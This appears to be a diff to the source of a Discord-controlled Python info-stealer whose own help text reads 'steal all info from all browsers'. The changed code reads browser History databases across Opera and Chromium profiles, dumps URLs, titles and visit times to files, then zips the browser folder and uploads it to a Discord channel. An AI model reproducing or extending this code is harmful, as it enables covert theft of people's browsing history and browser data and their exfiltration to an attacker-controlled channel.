@@ -414,31 +414,9 @@ class getinfo:
                 else:
                     pass
 
-                if name not in ['OperaGX', 'Opera']:    
-                    for profile in self.profiles:
-                        history_path = os.path.join(browser_path, profile, 'History')
-                        print(history_path)
-                        conn = sqlite3.connect(history_path)
-                        cursor = conn.cursor()
-                        cursor.execute('SELECT url, title, last_visit_time FROM urls')
-                        rows = cursor.fetchall()
-
-                        output_path = os.path.join(self.mainfolder, name, f'History_{profile}.txt')
-                        url_width = 100
-                        title_width = 100
-                        last_visit_width = 30
-
-                        output = open(output_path, 'w', encoding='utf-8')
-                        output.write(f"{'URL':<{url_width}} {'TITLE':<{title_width}} {'LAST VISIT':<{last_visit_width}}\n")
-                        output.write('='*(url_width + title_width + last_visit_width + 2) + '\n')
-                        for row in rows:
-                            url = self.remove_url_params(row[0])
-                            title = row[1]
-                            visit_time = self.convert_time(row[2])
-                            output.write(f'{url:<{url_width}} {title:<{title_width}} {visit_time}\n')
-
-                        conn.close()
-                else:
+                if name in ['OperaGX', 'Opera']:   
+                    input('OPERAS') 
+                    input(history_path)
                     conn = sqlite3.connect(history_path)
                     cursor = conn.cursor()
                     cursor.execute('SELECT url, title, last_visit_time FROM urls')
@@ -459,6 +437,36 @@ class getinfo:
                         output.write(f'{url:<{url_width}} {title:<{title_width}} {visit_time}\n')
 
                     conn.close()
+                    output.close()
+                else:
+                    input('NON OPERAS')
+                    for profile in self.profiles:
+                        try:
+                            history_path = os.path.join(browser_path, profile, 'History')
+                            input(history_path)
+                            conn = sqlite3.connect(history_path)
+                            cursor = conn.cursor()
+                            cursor.execute('SELECT url, title, last_visit_time FROM urls')
+                            rows = cursor.fetchall()
+
+                            output_path = os.path.join(self.mainfolder, name, f'History_{profile}.txt')
+                            url_width = 100
+                            title_width = 100
+                            last_visit_width = 30
+
+                            output = open(output_path, 'w', encoding='utf-8')
+                            output.write(f"{'URL':<{url_width}} {'TITLE':<{title_width}} {'LAST VISIT':<{last_visit_width}}\n")
+                            output.write('='*(url_width + title_width + last_visit_width + 2) + '\n')
+                            for row in rows:
+                                url = self.remove_url_params(row[0])
+                                title = row[1]
+                                visit_time = self.convert_time(row[2])
+                                output.write(f'{url:<{url_width}} {title:<{title_width}} {visit_time}\n')
+
+                            conn.close()
+                            output.close()
+                        except:
+                            pass
 
 
 
@@ -621,7 +629,7 @@ getbrowsers ▶ steal all info from all browsers
                         with zipfile.ZipFile(zip_dist, 'w', zipfile.ZIP_DEFLATED) as zipf:
                             utils.zip(chromiumfolder, zipf)
 
-                        tree = utils.generate_tree(zip_input)
+                        tree = utils.generate_tree(chromiumfolder)
                         await message.channel.send(f'```{tree}```')
                         await message.channel.send(file=discord.File(zip_dist))
                         os.remove(zip_dist)
